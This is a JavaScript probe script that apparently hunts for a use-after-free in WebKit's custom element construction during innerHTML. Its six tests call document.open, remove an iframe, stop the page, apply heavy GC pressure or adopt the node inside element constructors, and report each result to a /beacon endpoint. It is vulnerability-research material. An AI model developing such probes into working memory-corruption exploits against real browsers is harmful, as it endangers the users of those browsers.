// p132 — CE UAF refined probe
// p131 proved: document.open() SUCCEEDS inside CE constructor during innerHTML!
// document.body becomes null (removeChildren fired)
// Now: test registry state, try to trigger actual dangling pointer
//
// Key: the raw JSCustomElementInterface* in HTMLConstructionSite.cpp:791
// is borrowed from the registry. If we can destroy the registry or
// its entry during the constructor, enqueueToUpgrade dereferences freed memory.
//
// Strategy: document.open() + document.write() replaces the document.
// Does this cause a navigation that triggers didSecureTransitionTo?
// Also try: iframe-based approach where we define CE in iframe,
// then destroy iframe during its own CE constructor.
//
// Beacon prefix: V132R-
(function(){
var rid='v132r'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V132R-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V132R-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe132-start');

// ======== R1: Registry state after document.open in CE constructor ========
function testR1(){
  var r={};
  try{
    var registryBefore=null;
    var registryAfter=null;
    var registryErr=null;

    class RegCheckEl extends HTMLElement {
      constructor(){
        super();
        try{
          registryBefore=typeof window.customElements;
          // Check if our CE is still defined
          var getCE=window.customElements.get('regcheck-r1');
          r.ceDefinedBefore=(typeof getCE==='function');

          document.open();
          document.write('<html><body>replaced</body></html>');
          document.close();

          registryAfter=typeof window.customElements;
          var getCE2=window.customElements.get('regcheck-r1');
          r.ceDefinedAfter=(typeof getCE2==='function');
          r.sameCtor=(getCE===getCE2);
        }catch(e){
          registryErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
        }
      }
    }
    customElements.define('regcheck-r1',RegCheckEl);

    // Must use a container that exists
    var container=document.createElement('div');
    document.documentElement.appendChild(container);
    try{
      container.innerHTML='<regcheck-r1></regcheck-r1>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }

    r.registryBefore=registryBefore;
    r.registryAfter=registryAfter;
    r.registryErr=registryErr;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== R2: iframe CE — define in iframe, destroy iframe during constructor ========
function testR2(){
  var r={};
  try{
    var iframe=document.createElement('iframe');
    document.documentElement.appendChild(iframe);
    var iframeWin=iframe.contentWindow;
    var iframeDoc=iframe.contentDocument;

    var constructorRan=false;
    var iframeRemoved=false;

    // Define CE in the iframe's registry
    class IframeCE extends iframeWin.HTMLElement {
      constructor(){
        super();
        constructorRan=true;
        try{
          // Remove the iframe from the main document
          // This should trigger willDetachDocumentFromFrame on the iframe's window
          iframe.remove();
          iframeRemoved=true;
        }catch(e){
          r.removeErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
        }
      }
    }
    iframeWin.customElements.define('iframe-ce-r2',IframeCE);

    // innerHTML in the iframe document triggers the CE constructor
    var iframeContainer=iframeDoc.createElement('div');
    iframeDoc.body.appendChild(iframeContainer);
    try{
      iframeContainer.innerHTML='<iframe-ce-r2></iframe-ce-r2>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }

    r.constructorRan=constructorRan;
    r.iframeRemoved=iframeRemoved;
    r.iframeParent=iframe.parentNode?iframe.parentNode.tagName:'null';
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== R3: document.open + navigation in CE constructor ========
// document.open followed by location change
function testR3(){
  var r={};
  try{
    var phase='init';

    class NavCE extends HTMLElement {
      constructor(){
        super();
        phase='constructor';
        try{
          // Try to trigger a full navigation
          // history.pushState doesn't load a new document
          // window.stop() + document.open might work
          window.stop();
          phase='stopped';
        }catch(e){
          r.stopErr=e.constructor.name;
        }
      }
    }
    customElements.define('nav-r3',NavCE);

    var container=document.createElement('div');
    document.documentElement.appendChild(container);
    try{
      container.innerHTML='<nav-r3></nav-r3>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.phase=phase;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== R4: GC pressure during CE constructor ========
// Force GC to try to collect the interface's weak handles
function testR4(){
  var r={};
  try{
    var constructorRan=false;
    var gcDone=false;

    class GcCE extends HTMLElement {
      constructor(){
        super();
        constructorRan=true;
        // Massive allocation pressure to trigger GC
        var garbage=[];
        for(var i=0;i<5000;i++){
          garbage.push(new ArrayBuffer(65536)); // 64KB each = 320MB total
        }
        garbage=null;
        // More pressure
        for(var j=0;j<2000;j++){
          var obj={a:new Float64Array(1024),b:new Uint8Array(4096)};
        }
        gcDone=true;
      }
    }
    customElements.define('gc-r4',GcCE);

    var container=document.createElement('div');
    document.documentElement.appendChild(container);
    try{
      container.innerHTML='<gc-r4></gc-r4>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.constructorRan=constructorRan;
    r.gcDone=gcDone;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== R5: Multiple CEs in one innerHTML — interleaved construction ========
// innerHTML with two different CE types — second constructor modifies first's state
function testR5(){
  var r={};
  try{
    var sequence=[];

    class FirstCE extends HTMLElement {
      constructor(){
        super();
        sequence.push('first-ctor');
      }
      connectedCallback(){
        sequence.push('first-connected');
      }
    }
    class SecondCE extends HTMLElement {
      constructor(){
        super();
        sequence.push('second-ctor');
        // During second constructor, try document.open
        try{
          document.open();
          document.write('<html><body>hijacked</body></html>');
          document.close();
          sequence.push('second-docopen-ok');
        }catch(e){
          sequence.push('second-docopen-err:'+e.constructor.name);
        }
      }
    }
    customElements.define('first-r5',FirstCE);
    customElements.define('second-r5',SecondCE);

    var container=document.createElement('div');
    document.documentElement.appendChild(container);
    try{
      // Both CEs in one innerHTML — first constructed, then second
      container.innerHTML='<first-r5></first-r5><second-r5></second-r5>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.sequence=sequence;
    r.seqLen=sequence.length;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== R6: CE constructor + adoptNode to different document ========
// Move the element to a DOMParser document during construction
function testR6(){
  var r={};
  try{
    var adoptDone=false;
    var newDoc=new DOMParser().parseFromString('<html><body></body></html>','text/html');

    class AdoptCE extends HTMLElement {
      constructor(){
        super();
        try{
          // adoptNode moves 'this' to newDoc
          // This triggers adoptedCallback and changes ownerDocument
          newDoc.adoptNode(this);
          adoptDone=true;
        }catch(e){
          r.adoptErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
        }
      }
    }
    customElements.define('adopt-r6',AdoptCE);

    var container=document.createElement('div');
    document.documentElement.appendChild(container);
    try{
      container.innerHTML='<adopt-r6></adopt-r6>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.adoptDone=adoptDone;
    r.containerChildCount=container.childNodes.length;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== Run all ========
async function runAll(){
  var tests=[
    {name:'R1-REG-STATE',fn:testR1},
    {name:'R2-IFRAME-DESTROY',fn:testR2},
    {name:'R3-WIN-STOP',fn:testR3},
    {name:'R4-GC-PRESSURE',fn:testR4},
    {name:'R5-MULTI-CE',fn:testR5},
    {name:'R6-ADOPT-NODE',fn:testR6}
  ];
  for(var t=0;t<tests.length;t++){
    beacon(tests[t].name+'-PRE','starting');
    try{
      var result=tests[t].fn();
      beacon(tests[t].name,result||{});
    }catch(e){
      beacon(tests[t].name,{fatal:e.constructor.name+':'+String(e.message||'').slice(0,80)});
    }
    await new Promise(function(resolve){setTimeout(resolve,500);});
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
